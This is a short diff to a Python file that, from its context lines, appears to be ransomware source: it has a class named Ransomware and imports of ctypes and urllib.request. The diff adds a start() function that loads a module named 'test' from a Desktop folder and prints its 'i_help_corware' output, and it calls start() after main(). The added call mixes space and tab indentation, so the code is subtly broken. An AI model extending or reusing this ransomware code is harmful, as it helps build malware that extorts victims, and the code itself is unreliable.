@@ -5,6 +5,12 @@ import base64
 import ctypes
 import urllib.request
 
+def start():
+    import sys
+    sys.path.insert(0, './Desktop')
+    import test as file
+    print(file.i_help_corware())
+
 class Ransomware:
 
     def __init__(self, key=None):
@@ -143,4 +149,5 @@ def main():
 
 if __name__ == '__main__':
 	main()
+    start()
 	#change_background(self)
